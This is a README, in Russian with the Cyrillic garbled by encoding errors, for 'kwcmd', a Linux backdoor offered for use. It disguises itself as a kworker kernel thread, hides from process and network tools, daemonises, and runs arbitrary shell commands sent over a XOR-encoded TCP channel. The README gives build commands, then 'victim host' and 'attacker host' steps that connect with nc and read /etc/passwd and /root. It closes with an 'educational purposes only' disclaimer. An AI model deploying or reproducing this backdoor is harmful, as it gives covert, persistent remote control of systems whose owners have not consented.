# üëª kwcmd

**kwcmd** ‚Äî —ç—Ç–æ —Å–∫—Ä—ã—Ç—ã–π linux backdoor, –º–∞—Å–∫–∏—Ä—É—é—â–∏–π—Å—è –ø–æ–¥ —Å–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å `kworker`, —É–∫–ª–æ–Ω—è–µ–º—Å—è –æ—Ç top/htop/ps/netstat/ss, –∑–∞–º—ã–ª–∏–≤–∞–µ–º /proc/self/comm –∏ /proc/self/cmdline —Å–ª—É—à–∞—é—â–∏–π TCP-–ø–æ—Ä—Ç –∏ –∏—Å–ø–æ–ª–Ω—è—é—â–∏–π –∫–æ–º–∞–Ω–¥—ã, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º—É XOR –∫–∞–Ω–∞–ª—É.
---
### üõ†Ô∏è –ê–≤—Ç–æ—Ä: [reeves0x0]  For TG channel https://t.me/proxy_bar 
---

## ‚öôÔ∏è –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏

- ü•∑ –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ `[kworker/u8:7]`
  - –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ (`argv[0]`, `/proc/self/comm`, `prctl`)
  - –û—á–∏—Å—Ç–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∏ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
- üëª –î–µ–º–æ–Ω–∏–∑–∞—Ü–∏—è (–¥–≤–æ–π–Ω–æ–π `fork`, `setsid`, `umask(0)`)
- üì° TCP-—Å–µ—Ä–≤–µ—Ä –Ω–∞ –ø–æ—Ä—Ç—É `1337`
- üîê XOR-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ (`myxor`) + —Å–µ–∫—Ä–µ—Ç-—Ñ—Ä–∞–∑–∞ (`sesame:street`)
- üß® –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã—Ö shell-–∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ `popen`
- üì§ –û—Ç–≤–µ—Ç –∫–ª–∏–µ–Ω—Ç—É —Å –≤—ã–≤–æ–¥–æ–º stdout

---

## üì° –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç
–°–Ω–∞—á–∞–ª–∞ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É –ø–æ—Å—ã–ª–∞–µ—Ç—Å—è —Å–µ–∫—Ä–µ—Ç-—Ñ—Ä–∞–∑–∞ (`define SECRET "sesame:street"`) –µ—Å–ª–∏ —Ñ—Ä–∞–∑–∞ –≤–µ—Ä–Ω–∞ - —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –∫–∞–Ω–∞–ª –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ payloads –≤ XOR –≤–∏–¥–µ (`#define XOR_KEY "myxor"`) 

---

## üß™ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∏ –°–±–æ—Ä–∫–∞ (–Ω–µ –∑–∞–±—É–¥—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –ø–æ–¥ —Å–≤–æ–π –¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤)
–í —Ñ–∞–π–ª–∞—Ö:
- kwcmd.c  - –∑–∞–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤—ã –Ω–∞ —Å–≤–æ–∏:
  - #define PORT 1337
  - #define SECRET "sesame:street"
  - #define XOR_KEY "myxor"

- client-attacker.sh
  - KEY="myxor"
  - SECRET="sesame:street"
  - nc 10.101.1.15 1337

```bash
gcc kwcmd.c -o kwcmd
OR
gcc -static -no-pie -o kwcmd kwcmd.c
``` 
---

## üß®üß®üß® Lets GO
–ù–∞ —Ö–æ—Å—Ç–µ –∂–µ—Ä—Ç–≤—ã
```bash
./kwcmd
```

–ù–∞ —Ö–æ—Å—Ç–µ –∞—Ç–∞–∫—É—é—â–µ–≥–æ
```bash
chmod +x client-attacker.sh
client-attacker.sh "date && ls -llah /root"
OR
client-attacker.sh "cat /etc/passwd"
```

![–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ](https://github.com/user-attachments/assets/1265a1d6-8523-4f39-8090-3a5612e714ed)
---

‚ö†Ô∏è –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ

    –≠—Ç–æ—Ç –ø—Ä–æ–µ–∫—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö. –ê–≤—Ç–æ—Ä –Ω–µ –Ω–µ—Å—ë—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –±–æ–µ–≤—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö. 
